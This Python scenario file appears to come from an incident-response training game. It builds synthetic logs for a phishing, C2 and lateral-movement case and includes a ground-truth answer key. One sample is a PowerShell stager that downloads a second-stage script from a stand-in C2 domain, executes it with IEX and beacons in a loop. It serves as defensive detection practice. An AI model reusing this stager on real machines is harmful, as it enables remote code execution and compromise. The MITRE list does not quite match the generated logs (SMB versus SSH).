"""
Case 002 — Tier 2: Phishing → C2 → Lateral Movement

Multi-source case (process + DNS + auth logs). Player must correlate
across three independent log sources to reconstruct the full attack
chain: a phishing-delivered macro spawns PowerShell, which beacons out to
a C2 domain at regular intervals, then the attacker moves laterally to a
second host using stolen credentials.
"""
from datetime import datetime

from app.scenarios.scenario_base import BaseScenario, GroundTruth, MitreTechnique
from app.generators.process_log_gen import ProcessLogGenerator
from app.generators.dns_log_gen import DnsLogGenerator
from app.generators.auth_log_gen import AuthLogGenerator
from app.core.config import INTERNAL_SUBNET


class Case002PhishingLateral(BaseScenario):
    case_id = "case-002"
    title = "Invoice 4471"
    difficulty = 2
    log_sources = ["process_log", "dns_log", "auth_log"]
    briefing = (
        "An employee in Finance reported their workstation (ws-fin-014) 'acting "
        "strange' after opening an invoice attachment yesterday. IT hasn't found "
        "anything obviously wrong, but the helpdesk ticket has been escalated to "
        "you. You have process creation logs from the workstation, DNS query logs "
        "from the internal resolver, and SSH auth logs from the file server. "
        "Determine what happened, how far the attacker got, and submit a "
        "detection rule for the stage you think is most reliably detectable."
    )

    def generate(self):
        infected_host_ip = f"{INTERNAL_SUBNET}77"
        victim_user = "ltorres"
        c2_domain = "x7f3k9-updates.duckdns.org"
        target_host = "fileserver02"
        target_ip = f"{INTERNAL_SUBNET}50"

        # --- Process log (ws-fin-014) ---
        proc_gen = ProcessLogGenerator(seed=self.seed, hostname="ws-fin-014")
        proc_gen.generate_benign_traffic(count=40, time_window_hours=24)

        phishing_start = proc_gen.base_time.replace(hour=10, minute=22, second=0)
        t = proc_gen.inject_phishing_execution_chain(
            victim_user=victim_user, start_time=phishing_start, c2_domain=c2_domain
        )
        lateral_start = t.replace(hour=14, minute=5, second=0) if t.hour < 14 else t
        proc_gen.inject_lateral_movement(
            victim_user=victim_user, start_time=lateral_start,
            target_host=target_host, target_ip=target_ip,
        )

        # --- DNS log (internal resolver) ---
        dns_gen = DnsLogGenerator(seed=self.seed, resolver_host="dns-internal01")
        dns_gen.generate_benign_traffic(count=80, time_window_hours=24)
        beacon_start = proc_gen.base_time.replace(hour=10, minute=23, second=30)
        dns_gen.inject_c2_beacon(
            infected_host_ip=infected_host_ip,
            c2_domain=c2_domain,
            start_time=beacon_start,
            interval_seconds=60,
            beacon_count=25,
        )

        # --- Auth log (fileserver02 — lateral movement target) ---
        auth_gen = AuthLogGenerator(seed=self.seed + 1, hostname="fileserver02")
        auth_gen.generate_benign_traffic(count=30, time_window_hours=24)
        auth_attack_time = proc_gen.base_time.replace(hour=14, minute=6, second=10)
        auth_gen.add_event(
            auth_attack_time, "accepted_password", victim_user,
            infected_host_ip, 51500, is_attack=True,
        )

        # --- Assemble player views ---
        self.player_logs["process_log"] = proc_gen.player_view()
        self.player_logs["dns_log"] = dns_gen.player_view()
        self.player_logs["auth_log"] = auth_gen.player_view()

        self.raw_text_logs["process_log"] = proc_gen.render_text()
        self.raw_text_logs["dns_log"] = dns_gen.render_text()
        self.raw_text_logs["auth_log"] = auth_gen.render_syslog()

        # --- Recovered sample artifacts (for YARA-based file detection) ---
        # IR pulled these from PowerShell ScriptBlock Logging and the
        # Downloads folder during triage. One is the actual malicious
        # stager; the rest are unrelated benign scripts pulled from the
        # same machine to test for over-broad detection rules.
        self.samples["recovered_scriptblock_4471.ps1"] = (
            "# PowerShell ScriptBlock Log - Event ID 4104\n"
            "$wc = New-Object Net.WebClient\n"
            f"$payload = $wc.DownloadString('http://{c2_domain}/stage2.ps1')\n"
            "IEX $payload\n"
            "Start-Sleep -Seconds 60\n"
            "while ($true) {\n"
            f"    Invoke-WebRequest -Uri 'http://{c2_domain}/beacon' -UseBasicParsing\n"
            "    Start-Sleep -Seconds 60\n"
            "}\n"
        )
        self.samples["it_logon_script.ps1"] = (
            "# Standard domain logon script - IT department\n"
            "New-PSDrive -Name Q -PSProvider FileSystem -Root '\\\\fileserver01\\QualityDocs'\n"
            "Write-EventLog -LogName Application -Source 'LogonScript' "
            "-EventId 1000 -Message 'User logon script completed'\n"
        )
        self.samples["backup_inventory_check.ps1"] = (
            "# Nightly backup inventory verification\n"
            "$backups = Get-ChildItem -Path 'D:\\Backups' -Filter '*.bak'\n"
            "foreach ($b in $backups) {\n"
            "    Write-Output \"Verified: $($b.Name) - $($b.Length) bytes\"\n"
            "}\n"
        )

        process_attack_idx = [i for i, e in enumerate(proc_gen.sorted_entries()) if e["is_attack"]]
        dns_attack_idx = [i for i, e in enumerate(dns_gen.sorted_entries()) if e["is_attack"]]
        auth_attack_idx = [i for i, e in enumerate(auth_gen.sorted_entries()) if e["is_attack"]]

        self.ground_truth = GroundTruth(
            ioc_ips=[infected_host_ip, target_ip],
            ioc_usernames=[victim_user],
            ioc_domains=[c2_domain],
            attack_log_indices={
                "process_log": process_attack_idx,
                "dns_log": dns_attack_idx,
                "auth_log": auth_attack_idx,
            },
            malicious_sample_ids=["recovered_scriptblock_4471.ps1"],
            mitre_chain=[
                MitreTechnique("T1566.001", "Spearphishing Attachment", "Initial Access"),
                MitreTechnique("T1059.001", "PowerShell", "Execution"),
                MitreTechnique("T1071.004", "DNS", "Command and Control"),
                MitreTechnique("T1021.002", "SMB/Windows Admin Shares", "Lateral Movement"),
            ],
        )
